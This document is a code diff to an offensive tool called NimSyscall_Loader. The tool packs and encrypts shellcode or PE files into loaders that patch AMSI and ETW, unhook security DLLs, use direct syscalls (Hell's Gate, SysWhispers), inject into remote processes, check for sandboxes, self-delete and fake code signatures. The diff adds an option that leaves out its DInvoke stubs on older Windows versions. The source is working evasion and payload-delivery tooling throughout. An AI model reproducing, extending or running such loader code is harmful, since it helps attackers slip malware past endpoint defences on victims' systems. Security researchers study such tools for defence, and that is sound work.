@@ -57,7 +57,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -79,6 +79,7 @@ Options:
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --debug    Compiles the binary in debug mode (More DInvoke output)
   --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
+  --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
 
 [evasion]
 
@@ -186,6 +187,7 @@ var
     compileX86: bool = false
     noassembly: bool = false
     sleepycrypt: bool = false
+    noDInvoke: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.5")
 
@@ -344,6 +346,9 @@ if args["--debug"]:
 
 if args["--x86"]:
   compileX86 = true
+
+if args["--noDInvoke"]:
+  noDInvoke = true
 
 var blob: string
 
@@ -545,7 +550,9 @@ import base64
 import strutils
 import ptr_math
 import strenc
-import DInvoke
+
+when defined(DInvoke):
+    import DInvoke
 
 var success: BOOL
 
@@ -827,7 +834,8 @@ SleepyCryptLoop(10000)
 """
 
 var stub = Cryptstub1
-stub.add(DInvokeBaseStub)
+if (not noDInvoke):
+    stub.add(DInvokeBaseStub)
 
 if(pump):
     # makes no sense to import strenc when strings should be visible in the binary.
@@ -841,7 +849,7 @@ if(pump):
             stub.add(genTrustedwords(rand(3500..6200)))
 
 if(sandbox):
-    stub.add(DInvokeSandBoxStub)
+    if (not noDInvoke): stub.add(DInvokeSandBoxStub)
     for m in sandboxchecks:
         if(m == "Domain"):
             stub.add(DomainCheckStub)
@@ -870,7 +878,7 @@ if (syswhispers):
 
 if(unhook):
     if(hellsgate):
-        stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(WinLeanGetCurrentProcStub)
         stub.add(HellsgateStub)
@@ -879,7 +887,7 @@ if(unhook):
         stub.add(HellsgateNtCloseDelegate)
         stub.add(HellsgateUnhookStub)
     elif(getfreshstub):
-        stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
@@ -887,7 +895,7 @@ if(unhook):
         stub.add(UnhookSyscalls)
         stub.add(UnhookStub)
     elif(syswhispers):
-        stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(WhispersUnhookStub)
 else:
@@ -906,9 +914,9 @@ stub.add(Cryptstub2)
 stub.add(Cryptstub3)
 
 if (AMSI or ETW or peload or (localinject == false) or selfdelete):
-    stub.add(DInvokeLoadLibraryAGetProcAddress)
+    if (not noDInvoke): stub.add(DInvokeLoadLibraryAGetProcAddress)
     if (selfdelete):
-        stub.add(DInvokeSelfDeleteStubs)
+        if (not noDInvoke): stub.add(DInvokeSelfDeleteStubs)
         stub.add(FileDeleteStub)
 
 if (localinject):
@@ -935,7 +943,7 @@ if (remoteETWpatch or remoteAMSIpatch):
     if (gosleep == false):
         stub.add(SleepStubFirst)
     if (unhook == false):
-        stub.add(DInvokeGetModuleHandleADelegate)
+        if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
 
 if(dll_out):
     if (processname == ""):
@@ -1146,6 +1154,9 @@ elif system.hostOS == "linux":
 
 if (compileX86):
     basicCompileFlags.add("--cpu:i386 ")
+
+if not noDInvoke:
+    basicCompileFlags.add("-d:DInvoke ")
 
 if (dll_out):
     if (processname == ""):
